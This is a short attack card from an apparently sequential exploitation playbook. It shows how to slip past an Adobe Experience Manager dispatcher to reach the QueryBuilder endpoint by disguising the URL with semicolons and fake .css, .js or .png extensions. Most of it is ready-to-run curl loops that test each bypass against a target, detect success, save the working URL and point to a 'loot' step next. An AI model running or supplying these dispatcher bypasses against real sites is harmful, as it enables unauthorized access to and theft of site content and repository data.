# Batch 04 — Trick the bouncer (fake file type)

## FILL IN

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"
```

## GOAL
Reach QueryBuilder by making the URL look like a **css/js/png** file.

## TIME
~1 hour

## YOU NEED
- Batch 03 said the plain door is locked

---

## WHY (30 seconds)

**Bouncer (dispatcher)** = security guard that only reads the URL in a dumb way.  
**AEM (Sling)** = the real app that reads the URL in a smarter way.

If you put a `;` and a fake `.css` in the URL:

- Guard thinks: “static CSS file, OK”  
- App thinks: “QueryBuilder please”

That mismatch is the whole game.  
This card = **only** the semicolon / fake-extension family.

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
```

### 1) Prove door still locked

```bash
curl -sk -o /dev/null -w "direct:%{http_code}\n" \
  "$T/bin/querybuilder.json?path=/content&p.limit=1"
```

### 2) Try fake extensions (main trick)

```bash
for ext in css js png jpg html pdf; do
  u="/bin/querybuilder.json;x='a/b.${ext}/c'?path=/content&p.limit=3"
  code=$(curl -sk -o /tmp/qb.out -w "%{http_code}" "$T$u")
  bytes=$(wc -c </tmp/qb.out)
  echo "$code $bytes  $u"
  grep -qE 'hits|success|jcr:' /tmp/qb.out && echo ">>> OPEN" && head -c 200 /tmp/qb.out && echo
done
```

### 3) Extra shapes (same idea)

```bash
for u in \
  "/bin/querybuilder.json;%0aa.css?path=/content&p.limit=3" \
  "/bin/querybuilder.json.css?path=/content&p.limit=3" \
  "/bin/querybuilder.json/a.css?path=/content&p.limit=3"
do
  code=$(curl -sk -o /tmp/qb.out -w "%{http_code}" "$T$u")
  echo "$code  $u"
  grep -qE 'hits|success' /tmp/qb.out && head -c 200 /tmp/qb.out && echo
done
```

### 4) If one works — save it

```bash
# example if css worked:
export QB="$T/bin/querybuilder.json;x='a/b.css/c'"
echo "QB=$QB"
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| `>>> OPEN` or `"hits"` | Save `QB` → go **07** |
| All fail | Go **NEXT** (05) |
| Lots of 403 | Slow down. Still go 05 |

---

## NEXT
- Win → [07-loot-querybuilder.md](./07-loot-querybuilder.md)  
- Fail → [05-bypass-graphql.md](./05-bypass-graphql.md)
